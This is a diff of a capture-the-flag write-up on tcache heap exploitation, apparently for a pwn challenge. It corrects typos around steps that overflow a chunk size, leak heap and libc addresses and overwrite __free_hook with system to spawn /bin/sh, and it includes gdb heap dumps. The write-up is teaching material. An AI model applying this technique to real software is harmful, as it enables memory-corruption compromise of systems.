@@ -148,7 +148,7 @@ Edit(2, "A"*0x18+p64(0x3c1))
 Delete(7)
 ```
 
-State of heap memory after executing `Delete (7)`
+State of heap memory after executing `Delete(7)`
 ```
 0x604670:	0x0000000000000000	0x0000000000000031
 0x604680:	0x0000000000000000	0x0000000000000000
@@ -171,7 +171,7 @@ State of heap memory after executing `Delete (7)`
 0x604790:	0x0000000000000000	0x000000000001f871
 ```
 
-The heap address(`0x604700`) can be put in the` tcachebin` of `0x3c0`, so the heap address can be leaked.
+The heap address(`0x604700`) can be put in the `tcachebin` of `0x3c0`, so the heap address can be leaked.
 ```
 gdb-peda$ x/100gx 0x603200
 0x603200:	0x0000000000000000	0x0000000000000000
@@ -220,7 +220,7 @@ Create()
 Delete(11)
 ```
 
-If we can leak the `libc` address, we can easily write the `__free_hook` to the `tcache` using the `Edit` function. Similarly, we can write the address of the `system` function to `__free_hook`, so we can start `/bin/sh` by freeing the `chunk` that wrote `/bin/sh`.
+If we can leak the `libc` address, we can easily write the `__free_hook` to the `tcachebin` using the `Edit` function. Similarly, we can write the address of the `system` function to `__free_hook`, so we can start `/bin/sh` by freeing the `chunk` that wrote `/bin/sh`.
 
 ## Exploit code:
 The Exploit code is below.
